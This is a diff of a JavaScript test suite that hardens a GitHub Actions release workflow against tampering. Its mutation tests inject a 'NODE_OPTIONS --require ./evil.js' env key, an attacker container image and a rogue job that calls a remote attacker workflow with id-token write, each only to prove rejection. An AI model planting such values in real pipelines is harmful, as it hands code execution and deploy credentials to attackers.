-    const needsMatch = /\n\s{4}needs:\s*(\[[^\]]*\]|[^\n]+)/.exec(body);
-    const needs = needsMatch
-      ? needsMatch[1].replace(/[[\]]/g, '').split(',').map((s) => s.trim()).filter(Boolean)
-      : [];
-    const envMatch = /\n\s{4}environment:\s*([^\n]+)/.exec(body);
-    const ifMatch = /\n\s{4}if:\s*([^\n]+)/.exec(body);
-    meta.set(job.name, { needs, environment: envMatch ? envMatch[1].trim() : null, ifExpr: ifMatch ? ifMatch[1].trim() : null, body });
+  // ---- semantic guards, on the parsed object -------------------------------------------------
+  // Redundant while the object equals the reviewed one — deliberately: they police future edits of
+  // EXPECTED_WORKFLOW itself, and they give the named diagnostics the snapshot diff cannot.
+  const on = wf.on ?? {};
+  if (!on.workflow_dispatch || Object.keys(on).length !== 1) {
+    errors.push('the lane must be triggered by workflow_dispatch and nothing else');
   }
+  const jobs = wf.jobs ?? {};
   const ancestorsOf = (name, seen = new Set()) => {
-    for (const n of meta.get(name)?.needs ?? []) {
+    const needs = [].concat(jobs[name]?.needs ?? []);
+    for (const n of needs) {
       if (!seen.has(n)) {
         seen.add(n);
         ancestorsOf(n, seen);
@@ -222,177 +382,76 @@ export function releaseLaneErrors(text) {
     return seen;
   };
 
-  // ---- release identity job -----------------------------------------------------------------
-  const identity = meta.get('global-preflight');
-  if (!identity) errors.push('there is no global-preflight job');
-  else {
-    if (identity.environment) errors.push('global-preflight must not bind an Environment');
-    // The script's load-bearing lines. Their SEMANTICS are proven by execution below; this only
-    // pins that they exist, so a deletion cannot hide behind the executable tests being edited.
-    for (const [marker, why] of [
-      ['-ne 40', 'the full-length check'],
-      ['${RELEASE_SHA//[0-9a-f]/}', 'the whole-string charset check'],
-      ['cat-file -t', 'the commit-object proof'],
-      ['rev-parse --verify', 'the self-resolution proof'],
-      ['merge-base --is-ancestor', 'the ancestry check'],
-      ['release_sha=$resolved', 'emission of the RESOLVED OID'],
-    ]) {
-      if (!identity.body.includes(marker)) errors.push(`global-preflight lost ${why}`);
-    }
-    if (identity.body.includes('release_sha=$RELEASE_SHA')) {
-      errors.push('global-preflight emits the raw input instead of the resolved OID');
-    }
-    const idCheckout = /- uses: actions\/checkout[^]*?(?=\n      - name:)/.exec(identity.body);
-    if (!idCheckout || !/ref: main/.test(idCheckout[0]) || !/fetch-depth: 0/.test(idCheckout[0])) {
-      errors.push('global-preflight must check out main with full history, never the candidate');
-    }
-  }
-
-  // ---- checkouts: pinned to the RESOLVED OID everywhere else --------------------------------
-  if (/ref: \$\{\{ inputs\.release_sha \}\}/.test(code)) {
-    errors.push('the raw release_sha input is used as a checkout ref — only the resolved output may be');
-  }
-  for (const [name, m] of meta) {
-    if (name === 'global-preflight') continue;
-    const checkouts = m.body.split(/\n(?=      - uses: actions\/checkout)/).filter((c) => /uses: actions\/checkout/.test(c));
-    for (const chunk of checkouts) {
-      if (!/ref: \$\{\{ needs\.global-preflight\.outputs\.release_sha \}\}/.test(chunk)) {
-        errors.push(`a checkout in "${name}" is not pinned to the resolved release OID`);
+  for (const [name, job] of Object.entries(jobs)) {
+    for (const key of FORBIDDEN_JOB_KEYS) {
+      if (job && Object.hasOwn(job, key)) {
+        errors.push(`job "${name}" carries job-level ${key}, which hands execution to something unreviewed`);
       }
     }
-  }
-  for (const chunk of code.split(/\n(?=      - uses: actions\/checkout)/).filter((c) => /uses: actions\/checkout/.test(c))) {
-    if (!/persist-credentials: false/.test(chunk)) errors.push('a checkout persists credentials');
-  }
-
-  // ---- per-job gating: closed expressions, full DAG -----------------------------------------
-  for (const [name, m] of meta) {
-    if (name === 'global-preflight') continue;
-    const ancestors = ancestorsOf(name);
-    if (!ancestors.has('global-preflight')) errors.push(`job "${name}" does not descend from global-preflight`);
-    if (!m.ifExpr) {
-      errors.push(`job "${name}" has no explicit success condition`);
-    } else {
-      if (Object.hasOwn(EXPECTED_IF, name) && m.ifExpr !== EXPECTED_IF[name]) {
-        errors.push(`job "${name}" changed its success condition from the pinned expression`);
+    for (const step of job?.steps ?? []) {
+      if (step.uses && !/@[0-9a-f]{40}$/.test(step.uses)) {
+        errors.push(`job "${name}" pins an action to a mutable ref — a full commit SHA is required`);
       }
-      if (!IF_GRAMMAR.test(m.ifExpr)) errors.push(`job "${name}" has a success condition outside the closed grammar`);
-      for (const ref of m.ifExpr.matchAll(/needs\.([A-Za-z_][\w-]*)\.result/g)) {
-        if (!m.needs.includes(ref[1])) errors.push(`job "${name}" conditions on "${ref[1]}" without depending on it`);
+      if (typeof step.run === 'string' && DEPLOY_COMMAND.test(step.run)) {
+        errors.push(`job "${name}" invokes a deploy command; Slice A deploys nothing and later slices go through deploy-release.js`);
       }
     }
-    if (/continue-on-error:\s*true/.test(m.body)) errors.push(`job "${name}" is continue-on-error`);
-
-    if (m.environment === 'pilot' && name !== 'pilot-preflight') {
-      if (!ancestors.has('pilot-preflight')) errors.push(`pilot-bound job "${name}" does not descend from the pilot preflight`);
-      if (!ancestors.has('dev-stage')) errors.push(`pilot-bound job "${name}" does not descend from the green dev stage`);
+    if (name === 'global-preflight') {
+      if (job && Object.hasOwn(job, 'environment')) errors.push('global-preflight must not bind an Environment');
+      continue;
     }
-    if (m.environment === 'dev' && name !== 'dev-preflight' && !ancestors.has('dev-preflight')) {
-      errors.push(`dev-bound job "${name}" does not descend from the dev preflight`);
+    if (typeof job?.if !== 'string' || !IF_GRAMMAR.test(job.if)) {
+      errors.push(`job "${name}" has a success condition outside the closed grammar`);
     }
-
-  }
-
-  // THE CLOSED SHAPE: every step in EVERY job — global-preflight included — is an allowlisted
-  // action or a reviewed run template. This loop deliberately lives OUTSIDE the per-job gating loop:
-  // that loop skips global-preflight (it has no needs/if to validate), and a first draft of this
-  // rule sat inside it, which left the identity job's steps entirely unvalidated — a mutable
-  // checkout tag there returned zero errors. A skip for one rule must never become a skip for all.
-  for (const job of jobs) {
-    const name = job.name;
-    stepsOf(job.text).forEach((chunk, i) => {
-
-      const usesMatch = /(?:^|\n)\s{6,8}(?:- )?uses: (\S+)/.exec(chunk);
-      if (usesMatch) {
-        const action = usesMatch[1];
-        // Round 6: a MUTABLE ref can move after review, including in a job with id-token: write.
-        // Only full commit SHAs are immutable.
-        if (!/@[0-9a-f]{40}$/.test(action)) {
-          errors.push(`job "${name}" step ${i + 1} pins an action to a mutable ref — a full commit SHA is required`);
-        }
-        const { keys, withBlock } = parseStep(chunk);
-        // A uses-step may carry NOTHING beyond name/uses/with: an `env:` or `id:` on an action is
-        // configuration nobody reviewed.
-        for (const k of Object.keys(keys)) {
-          if (!USES_STEP_KEYS.has(k)) errors.push(`job "${name}" step ${i + 1} carries an unreviewed step property`);
-        }
-        if (!Object.hasOwn(ACTION_SCHEMAS, action)) {
-          errors.push(`job "${name}" step ${i + 1} uses an action outside the closed allowlist`);
-          return;
-        }
-        const variants = ACTION_SCHEMAS[action];
-        const supplied = withBlock ?? {};
-        if (!variants.some((v) => sameMapping(v, supplied))) {
-          errors.push(`job "${name}" step ${i + 1} configures ${action} outside its reviewed schema`);
-        }
-        return;
-      }
-      const block = runBlockOf(chunk);
-      if (block !== null) {
-        const schema = RUN_STEP_SCHEMAS.find((t) => t.block === block);
-        if (!schema) {
-          errors.push(`job "${name}" step ${i + 1} runs a block outside the reviewed templates`);
-          return;
-        }
-        // The WHOLE step object is pinned: keys and env, not just the command body. `shell:`,
-        // `working-directory:`, `continue-on-error:` and a smuggled env variable all die here.
-        const { keys, envBlock } = parseStep(chunk);
-        if (JSON.stringify(Object.keys(keys).sort()) !== JSON.stringify(schema.stepKeys)) {
-          errors.push(`job "${name}" step ${i + 1} carries unreviewed run-step properties`);
-        }
-        if (!sameMapping(envBlock ?? {}, schema.env ?? {})) {
-          errors.push(`job "${name}" step ${i + 1} carries an unreviewed env block`);
-        }
-        return;
-      }
-      const single = /(?:^|\n)\s{8}run: (?!\|)([^\n]+)/.exec(chunk);
-      if (single) {
-        if (!SINGLE_LINE_RUNS.has(single[1].trim())) {
-          errors.push(`job "${name}" step ${i + 1} runs a command outside the reviewed set`);
-        }
-        const { keys } = parseStep(chunk);
-        if (JSON.stringify(Object.keys(keys).sort()) !== JSON.stringify(['name', 'run'])) {
-          errors.push(`job "${name}" step ${i + 1} carries unreviewed properties on a command step`);
-        }
-        return;
-      }
-      errors.push(`job "${name}" step ${i + 1} has a shape the invariants do not recognise`);
-    });
-  }
-
-  // ---- pilot entry: the mode clause lives on the pinned expression --------------------------
-  const pp = meta.get('pilot-preflight');
-  if (!pp) errors.push('there is no pilot-preflight job');
-  else if (!pp.needs.includes('dev-stage')) errors.push('pilot-preflight does not directly depend on the dev stage');
-  if (!meta.get('pilot-stage')) errors.push('there is no pilot-stage job');
-
-  // ---- stage jobs must verify the manifest even before any deploy exists --------------------
-  for (const [name, m] of meta) {
-    if (/-stage$/.test(name) && !m.body.includes('verify-manifest')) {
-      errors.push(`stage job "${name}" does not verify the preflight manifest`);
+    if (!ancestorsOf(name).has('global-preflight')) errors.push(`job "${name}" does not descend from global-preflight`);
+    if (job?.environment === 'pilot' && name !== 'pilot-preflight') {
+      const a = ancestorsOf(name);
+      if (!a.has('pilot-preflight')) errors.push(`pilot-bound job "${name}" does not descend from the pilot preflight`);
+      if (!a.has('dev-stage')) errors.push(`pilot-bound job "${name}" does not descend from the green dev stage`);
     }
   }
-
-  // ---- secrets and identifiers ---------------------------------------------------------------
-  if (!/role-to-assume: \$\{\{ secrets\./.test(code)) errors.push('the deploy role ARN must come from a secret, not a variable');
-  if (!/mask-aws-account-id: true/.test(code)) errors.push('account-id masking must be enabled');
-  if (/\b\d{12}\b/.test(code)) errors.push('the workflow contains a literal 12-digit account id');
-  if (/arn:aws:iam::\d/.test(code)) errors.push('the workflow contains a literal IAM ARN');
+  const pp = jobs['pilot-preflight'];
+  if (!pp || ![].concat(pp.needs ?? []).includes('dev-stage')) {
+    errors.push('pilot-preflight does not directly depend on the dev stage');
+  }
+  if (pp && !/inputs\.mode == 'dev_then_pilot'/.test(pp.if ?? '')) {
+    errors.push('pilot-preflight is reachable without the operator asking for promotion');
+  }
 
   return errors;
 }
 
-/* ================= the real file, and the parser itself ======================================== */
+/* ================= the real file ================================================================ */
 
-test('the release lane satisfies every structural invariant', () => {
+test('the release lane parses cleanly and EQUALS the reviewed object', () => {
   assert.deepEqual(releaseLaneErrors(raw), []);
 });
 
-test('the job parser actually partitions the file — the rules are per-job, not per-file', () => {
-  const jobs = jobsOf(raw);
-  assert.deepEqual(jobs.map((j) => j.name), ['global-preflight', 'dev-preflight', 'dev-stage', 'pilot-preflight', 'pilot-stage']);
-  assert.equal(/\n\s{4}needs:/.test(jobs[0].text), false, 'global-preflight must not carry a neighbour’s needs:');
-  assert.equal(/\n\s{4}environment:/.test(jobs[0].text), false, 'global-preflight must not carry a neighbour’s environment:');
+test('YAML sees exactly the five reviewed jobs — the round-7 lesson, asserted at the source', () => {
+  const { wf } = parseWorkflow(raw);
+  assert.deepEqual(Object.keys(wf.jobs), ['global-preflight', 'dev-preflight', 'dev-stage', 'pilot-preflight', 'pilot-stage']);
+  assert.deepEqual(Object.keys(wf), ['name', 'on', 'permissions', 'concurrency', 'jobs']);
+});
+
+test('Slice A deploys nothing: no run string contains a deploy command or the entrypoint', () => {
+  const { wf } = parseWorkflow(raw);
+  for (const [name, job] of Object.entries(wf.jobs)) {
+    for (const step of job.steps ?? []) {
+      if (typeof step.run !== 'string') continue;
+      assert.equal(DEPLOY_COMMAND.test(step.run), false, `${name} must not deploy in Slice A`);
+      assert.equal(step.run.includes('deploy-release.js'), false, `${name} must not invoke the entrypoint in Slice A`);
+    }
+  }
+});
+
+test('the human gate is DECLARED but not yet real, and the file says so', () => {
+  // Comments are the one thing YAML cannot see; the disclosures live there, so this reads raw text.
+  assert.match(raw, /THE HUMAN GATE IS NOT YET REAL/);
+  assert.match(raw, /ZERO configured GitHub/);
+  assert.match(raw, /treated as ungated, and no deploy slice may be approved/);
+  assert.match(raw, /BOTH Environments must restrict deployment branches to main only/);
+  assert.match(raw, /`pilot` additionally requires the designated reviewer/);
+  assert.match(raw, /executes the workflow\n# DEFINITION from the branch the operator selects/);
 });
 
 /* ================= mutations ==================================================================== */
@@ -401,6 +460,70 @@ const rejects = (mutated, why) => {
   assert.notEqual(mutated, raw, `mutation did not apply: ${why}`);
   assert.notDeepEqual(releaseLaneErrors(mutated), [], `must be rejected: ${why}`);
 };
+
+/** The round-7 payloads must be PROVEN ACTIVE under YAML before their rejection means anything. */
+const activeAt = (mutated, probe) => {
+  const { wf, errors } = parseWorkflow(mutated);
+  if (errors) return { parseRefused: true };
+  return { value: probe(wf) };
+};
+
+test('POSITIVE CONTROL: every reproduction from the round-7 review is rejected by name', () => {
+  // (a) A QUOTED env key on a reviewed step. Invisible to the old regex; real to YAML.
+  const quotedEnv = raw.replace(
+    '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}',
+    '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}\n          "NODE_OPTIONS": --require ./evil.js',
+  );
+  assert.equal(
+    activeAt(quotedEnv, (wf) => wf.jobs['dev-preflight'].steps.at(-1).env.NODE_OPTIONS).value,
+    '--require ./evil.js',
+    'YAML must parse the quoted env key as ACTIVE configuration — that is the whole finding',
+  );
+  rejects(quotedEnv, 'a quoted NODE_OPTIONS env key');
+
+  // (b) A QUOTED action input.
+  const quotedWith = raw.replace(
+    '          mask-aws-account-id: true',
+    '          mask-aws-account-id: true\n          "role-duration-seconds": 43200',
+  );
+  assert.equal(
+    activeAt(quotedWith, (wf) => wf.jobs['dev-preflight'].steps.find((s) => s.uses?.startsWith('aws-actions/')).with['role-duration-seconds']).value,
+    43200,
+  );
+  rejects(quotedWith, 'a quoted action input');
+
+  // (c) Job-level env, and a job-level container.
+  const jobEnv = raw.replace(
+    '  dev-stage:\n    name: Dev stage (not implemented in Slice A)',
+    '  dev-stage:\n    env:\n      NODE_OPTIONS: --require ./evil.js\n    name: Dev stage (not implemented in Slice A)',
+  );
+  assert.equal(activeAt(jobEnv, (wf) => wf.jobs['dev-stage'].env.NODE_OPTIONS).value, '--require ./evil.js');
+  rejects(jobEnv, 'a job-level env block');
+
+  const container = raw.replace(
+    '  dev-stage:\n    name: Dev stage (not implemented in Slice A)',
+    '  dev-stage:\n    container: attacker/example:latest\n    name: Dev stage (not implemented in Slice A)',
+  );
+  assert.equal(activeAt(container, (wf) => wf.jobs['dev-stage'].container).value, 'attacker/example:latest');
+  rejects(container, 'a job-level container');
+
+  // (d) The QUOTED sixth job calling a remote reusable workflow — five jobs to the old parser,
+  // six to YAML, with id-token: write.
+  const rogue = `${raw}\n  "rogue":\n    permissions:\n      contents: read\n      id-token: write\n    uses: attacker/example/.github/workflows/release.yml@main\n`;
+  assert.equal(
+    activeAt(rogue, (wf) => wf.jobs.rogue.uses).value,
+    'attacker/example/.github/workflows/release.yml@main',
+    'YAML must parse the quoted job id as a real sixth job',
+  );
+  const rogueErrors = releaseLaneErrors(rogue);
+  assert.ok(rogueErrors.some((e) => e.includes('jobs.rogue')), 'the diff must name the rogue job');
+  assert.ok(rogueErrors.some((e) => e.includes('job-level uses')), 'the reusable-workflow call must be refused by its own rule too');
+
+  // And a duplicate key — two `permissions:` mappings at the top level — is refused at parse time.
+  const dup = raw.replace('permissions:\n  contents: read\n', 'permissions:\n  contents: read\npermissions:\n  contents: read\n');
+  assert.notEqual(dup, raw);
+  assert.ok(releaseLaneErrors(dup).some((e) => e.includes('not clean YAML')), 'duplicate keys must refuse at parse time');
+});
 
 test('POSITIVE CONTROL: release identity cannot be weakened', () => {
   rejects(raw.replace(' || [ -n "${RELEASE_SHA//[0-9a-f]/}" ]', ''), 'the whole-string charset check removed');
@@ -414,144 +537,30 @@ test('POSITIVE CONTROL: release identity cannot be weakened', () => {
   );
 });
 
-test('POSITIVE CONTROL: the checkout pinning cannot be loosened', () => {
+test('POSITIVE CONTROL: pinning, inputs, gating and credentials cannot be loosened', () => {
   rejects(raw.replaceAll('          ref: ${{ needs.global-preflight.outputs.release_sha }}\n', ''), 'unpinned checkouts');
   rejects(raw.replaceAll('ref: ${{ needs.global-preflight.outputs.release_sha }}', 'ref: ${{ inputs.release_sha }}'), 'checkouts pinned to the raw input');
   rejects(raw.replaceAll('          persist-credentials: false\n', ''), 'checkouts persist credentials');
-});
-
-test('POSITIVE CONTROL: no operator input may reintroduce a target or a direct pilot path', () => {
   rejects(raw.replace('      mode:', '      environment:\n        description: x\n        required: true\n        type: string\n      mode:'), 'an environment input');
   rejects(raw.replace('      mode:', '      auth_callback_urls:\n        description: x\n        required: true\n        type: string\n      mode:'), 'a caller-supplied URL input');
-  rejects(raw.replace('      mode:', '      expected_user_pool_id:\n        description: x\n        required: false\n        type: string\n      mode:'), 'a caller-supplied pool id');
   rejects(raw.replace('on:\n  workflow_dispatch:', 'on:\n  push:\n    branches: [main]\n  workflow_dispatch:'), 'an automatic trigger');
   rejects(raw.replace("    if: needs.dev-stage.result == 'success' && inputs.mode == 'dev_then_pilot'", "    if: needs.global-preflight.result == 'success'"), 'pilot entry without the dev stage or the mode');
   rejects(raw.replace('\n    needs: [global-preflight, dev-preflight, dev-stage]', '\n    needs: [global-preflight]'), 'pilot-preflight detached from the dev stage');
-});
-
-/** Replace the dev stage's terminal step with an arbitrary injected step, for bypass mutations. */
-const injectDevStep = (step) =>
-  raw.replace(
-    /      - name: Slice A stops here\n        run: \|\n          echo "Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,"\n          echo "no account mutation and no paid call happened in this run."\n\n  # -+\n  # PILOT PREFLIGHT/,
-    `${step}\n\n  # x\n  # PILOT PREFLIGHT`,
-  );
-
-test('POSITIVE CONTROL: every reproduction from the round-2 review is rejected by name', () => {
-  // (1) A deploy that merely echoes the digest.
-  rejects(
-    injectDevStep('      - name: Deploy\n        env:\n          CONTEXT_DIGEST: ${{ needs.dev-preflight.outputs.context_digest }}\n        run: |\n          echo "$CONTEXT_DIGEST"\n          cdk deploy --all'),
-    'echo "$CONTEXT_DIGEST"; cdk deploy --all',
-  );
-
-  // (2) `|| true` appended to a pinned success expression.
-  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", "    if: needs.dev-preflight.result == 'success' || true\n    runs-on"), "|| true");
-
-  // (3) An OR branch that accepts a FAILED dependency.
-  rejects(
-    raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", "    if: needs.dev-preflight.result == 'success' || needs.dev-preflight.result == 'failure'\n    runs-on"),
-    "|| result == 'failure'",
-  );
-
-  // (4) An extra pilot deployment job that skips the dev stage and merely mentions the digest.
-  const extraJob = `${raw}
-  pilot-deploy:
-    name: Rogue pilot deploy
-    needs: [global-preflight]
-    if: needs.global-preflight.result == 'success'
-    runs-on: ubuntu-latest
-    environment: pilot
-    steps:
-      - name: Deploy
-        run: |
-          echo context_digest
-          cdk deploy --all
-`;
-  rejects(extraJob, 'an extra pilot deploy job descending only from global-preflight');
-});
-
-test('POSITIVE CONTROL: every reproduction from the round-3 review is rejected by name', () => {
-  // (1) Verify a safe context, then deploy a different one. The two-command shape itself is what
-  // gets refused: NO raw deploy may exist, whatever verification precedes it — the binding lives in
-  // bin/deploy-release.js, which derives the deploy from the very object it verified.
-  rejects(
-    injectDevStep('      - name: Deploy\n        run: |\n          node infra/aws/bin/deploy-preflight.js verify-manifest --recompute --region us-east-1 --manifest m.json --environment dev --release-sha x -c authDomainPrefix=safe\n          cdk deploy --all -c authDomainPrefix=other'),
-    'verify context A, deploy context B',
-  );
-
-  // (2) Verify, swap credentials, deploy.
-  rejects(
-    injectDevStep('      - name: Verify\n        run: |\n          node infra/aws/bin/deploy-preflight.js verify-manifest --recompute --region us-east-1 --manifest m.json --environment dev --release-sha x\n      - name: Swap credentials\n        uses: aws-actions/configure-aws-credentials@v6\n        with:\n          role-to-assume: ${{ secrets.OTHER_ROLE }}\n          aws-region: ${{ vars.AWS_REGION }}\n          mask-aws-account-id: true\n      - name: Deploy\n        run: |\n          cdk deploy --all'),
-    'verify, replace credentials, deploy',
-  );
-
-  // (3) Verify an AWS manifest, then deploy an unrelated Cloudflare target.
-  rejects(
-    injectDevStep('      - name: Deploy\n        run: |\n          node infra/aws/bin/deploy-preflight.js verify-manifest --recompute --region us-east-1 --manifest m.json --environment dev --release-sha x\n          wrangler deploy'),
-    'verify AWS, deploy Cloudflare',
-  );
-
-  // The sanctioned entrypoint is still held to the DAG: outside a properly descended,
-  // Environment-bound job it is refused too.
-  const rogueEntrypoint = `${raw}
-  pilot-deploy:
-    name: Rogue entrypoint use
-    needs: [global-preflight]
-    if: needs.global-preflight.result == 'success'
-    runs-on: ubuntu-latest
-    environment: pilot
-    steps:
-      - name: Deploy
-        run: |
-          node infra/aws/bin/deploy-release.js --manifest m.json --environment pilot --release-sha x --region x
-`;
-  rejects(rogueEntrypoint, 'the entrypoint outside the pilot DAG');
-
-  const noEnvEntrypoint = `${raw}
-  side-deploy:
-    name: Entrypoint without an Environment
-    needs: [global-preflight]
-    if: needs.global-preflight.result == 'success'
-    runs-on: ubuntu-latest
-    steps:
-      - name: Deploy
-        run: |
-          node infra/aws/bin/deploy-release.js --manifest m.json --environment dev --release-sha x --region x
-`;
-  rejects(noEnvEntrypoint, 'the entrypoint with no Environment binding');
-});
-
-test('POSITIVE CONTROL: credentials, gating style and identifiers cannot be loosened', () => {
+  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", "    if: needs.dev-preflight.result == 'success' || true\n    runs-on"), '|| true');
+  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    if: always()\n    runs-on'), 'always()');
+  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    runs-on'), 'a dependency with no explicit success condition');
   rejects(raw.replaceAll('secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN', 'vars.AWS_DEPLOY_PREFLIGHT_ROLE_ARN'), 'the role ARN moved to a variable');
   rejects(raw.replaceAll('          mask-aws-account-id: true\n', ''), 'account-id masking removed');
   rejects(raw.replace('${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}', `arn:aws:iam::${'9'.repeat(12)}:role/x`), 'a literal IAM ARN');
-  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    if: always()\n    runs-on'), 'always()');
-  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    if: !cancelled()\n    runs-on'), '!cancelled()');
-  rejects(raw.replace("    if: needs.dev-preflight.result == 'success'\n    runs-on", '    runs-on'), 'a dependency with no explicit success condition');
-  rejects(raw.replace('  dev-stage:\n    name: Dev stage (not implemented in Slice A)\n    needs: [global-preflight, dev-preflight]\n', '  dev-stage:\n    name: Dev stage (not implemented in Slice A)\n    needs: [global-preflight, dev-preflight]\n    continue-on-error: true\n'), 'continue-on-error');
-  rejects(raw.replaceAll('verify-manifest', 'noop'), 'stage jobs no longer verify the manifest');
+
+  // The pin rule keeps ITS OWN error: the schema diff would flag the unknown value anyway, and a
+  // control satisfied by that redundancy goes green when the pin rule is deleted.
+  const tagged = raw.replace('actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7', 'actions/checkout@v7');
+  assert.notEqual(tagged, raw);
+  assert.ok(releaseLaneErrors(tagged).some((e) => e.includes('mutable ref')), 'a tag reference must be refused by the pin rule itself');
 });
 
-test('POSITIVE CONTROL: every reproduction from the round-4 review is rejected by name', () => {
-  // (3) The verb-indirection bypass: `verb=deploy; npx cdk "$verb"` contains no deploy verb for a
-  // blacklist to see. Under the closed shape it is simply a run block nobody reviewed.
-  rejects(
-    injectDevStep('      - name: Deploy\n        run: |\n          verb=deploy\n          npx cdk "$verb" --all'),
-    'verb=deploy; npx cdk "$verb" --all',
-  );
-
-  // A deployment smuggled through an ACTION instead of a command.
-  rejects(
-    injectDevStep('      - name: Deploy\n        uses: someorg/cdk-deploy-action@v1\n        with:\n          stacks: all'),
-    'a deploy action outside the allowlist',
-  );
-
-  // A single-line run outside the reviewed set.
-  rejects(
-    injectDevStep('      - name: Sneak\n        run: npx cdk deploy --all'),
-    'a single-line run outside the reviewed set',
-  );
-
-  // A reviewed template with ONE line added is no longer the reviewed template.
+test('POSITIVE CONTROL: reviewed step objects cannot grow properties, env entries or new commands', () => {
   rejects(
     raw.replace(
       "          printf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"",
@@ -559,38 +568,22 @@ test('POSITIVE CONTROL: every reproduction from the round-4 review is rejected b
     ),
     'a template with an injected line',
   );
-
-  // Dropping a required property from an allowlisted action.
-  rejects(raw.replace('          fetch-depth: 0\n          persist-credentials: false', '          fetch-depth: 0'), 'checkout without persist-credentials: false');
-});
-
-test('POSITIVE CONTROL: every reproduction from the round-5 review is rejected by name', () => {
-  // (2) Action authority drift — each of these returned ZERO errors under the name-plus-regex
-  // allowlist, because presence-of-required is not absence-of-everything-else.
   rejects(
-    raw.replaceAll('secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN', 'secrets.AWS_DEPLOY_ADMIN_ROLE_ARN'),
-    'the deploy role swapped for an admin role',
-  );
-  rejects(raw.replaceAll('          aws-region: ${{ vars.AWS_REGION }}\n', ''), 'every aws-region removed');
-  rejects(
-    raw.replace(
-      '          mask-aws-account-id: true',
-      '          mask-aws-account-id: true\n          role-duration-seconds: 43200',
-    ),
-    'an arbitrary extra action input',
+    injectDevStep('      - name: Deploy\n        run: |\n          verb=deploy\n          npx cdk "$verb" --all'),
+    'verb=deploy; npx cdk "$verb" --all',
   );
   rejects(
-    raw.replace(
-      '      - uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6\n        with:\n          node-version: 22\n          cache: npm',
-      '      - uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6\n        env:\n          NODE_OPTIONS: --experimental-loader=evil\n        with:\n          node-version: 22\n          cache: npm',
-    ),
-    'an env block smuggled onto an action step',
+    injectDevStep('      - name: Deploy\n        uses: someorg/cdk-deploy-action@v1\n        with:\n          stacks: all'),
+    'a deploy action outside the reviewed object',
   );
-});
-
-test('POSITIVE CONTROL: every reproduction from the round-6 review is rejected by name', () => {
-  // (2) The exact NODE_OPTIONS bypass: the approved command text is retained, arbitrary Node
-  // executes anyway. The step's env is part of the reviewed object now.
+  rejects(
+    injectDevStep('      - name: Sneak\n        run: npx cdk deploy --all'),
+    'a single-line run outside the reviewed object',
+  );
+  rejects(
+    raw.replace('      - name: Slice A stops here\n        run: |', '      - name: Slice A stops here\n        shell: python\n        run: |'),
+    'a shell override on a reviewed run step',
+  );
   rejects(
     raw.replace(
       '          CBA_EXPECTED_USER_POOL_ID: ${{ secrets.CBA_EXPECTED_USER_POOL_ID }}',
@@ -598,80 +591,31 @@ test('POSITIVE CONTROL: every reproduction from the round-6 review is rejected b
     ),
     'NODE_OPTIONS smuggled into a reviewed run step',
   );
+});
 
-  // Another unauthorized run-step property: a shell override on a reviewed block.
-  rejects(
-    raw.replace(
-      '      - name: Slice A stops here\n        run: |',
-      '      - name: Slice A stops here\n        shell: python\n        run: |',
-    ),
-    'a shell override on a reviewed run step',
+/** Replace the dev stage's terminal step with an arbitrary injected step, for bypass mutations. */
+function injectDevStep(step) {
+  return raw.replace(
+    /      - name: Slice A stops here\n        run: \|\n          echo "Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,"\n          echo "no account mutation and no paid call happened in this run."\n\n  # -+\n  # PILOT PREFLIGHT/,
+    `${step}\n\n  # x\n  # PILOT PREFLIGHT`,
   );
-
-  // (3) A mutable tag where a full commit SHA is required. The schema-key closure would refuse the
-  // unknown name anyway, so the assertion demands the PIN rule's own error — otherwise removing the
-  // rule stays green behind the redundancy, which is exactly what a discrimination check exists to
-  // catch.
-  const tagged = raw.replace('actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7', 'actions/checkout@v7');
-  assert.notEqual(tagged, raw, 'mutation did not apply: mutable tag');
-  assert.ok(
-    releaseLaneErrors(tagged).some((e) => e.includes('mutable ref')),
-    'a tag reference must be refused BY THE PIN RULE, not merely by schema-key mismatch',
-  );
-});
-
-test('Slice A deploys nothing: no deploy command and no entrypoint invocation exist in the lane yet', () => {
-  const code = stripComments(raw);
-  assert.equal(/\bcdk\s+deploy\b/.test(code), false);
-  assert.equal(/\bopennextjs-cloudflare\s+deploy\b/.test(code), false);
-  assert.equal(/\bwrangler\s+deploy\b/.test(code), false);
-  assert.equal(code.includes('deploy-release.js'), false, 'the entrypoint exists for later slices; Slice A never calls it');
-});
-
-test('the human gate is DECLARED but not yet real, and the file says so', () => {
-  assert.match(raw, /THE HUMAN GATE IS NOT YET REAL/);
-  assert.match(raw, /ZERO configured GitHub/);
-  assert.match(raw, /treated as ungated, and no deploy slice may be approved/);
-  // Round 3: BOTH Environments need a main-only deployment-branch policy — an Environment without
-  // one hands its variables and secrets to a workflow definition from any branch.
-  assert.match(raw, /BOTH Environments must restrict deployment branches to main only/);
-  assert.match(raw, /`pilot` additionally requires the designated reviewer/);
-  // The inherent workflow_dispatch limit is disclosed too: the identity job constrains the RELEASE,
-  // not the workflow definition; the branch restriction is what constrains the file.
-  assert.match(raw, /executes the workflow\n# DEFINITION from the branch the operator selects/);
-});
+}
 
 /* ================= the identity script, EXECUTED =============================================== */
 //
-// A shell pattern can only be trusted by running it. The committed `case ... [0-9a-f]*` accepted
-// "a" followed by 39 uppercase Zs — every text assertion in the previous version looked straight
-// past that. These tests extract the script from the YAML and run it under a stubbed git, so the
-// refusals are observed, not inferred.
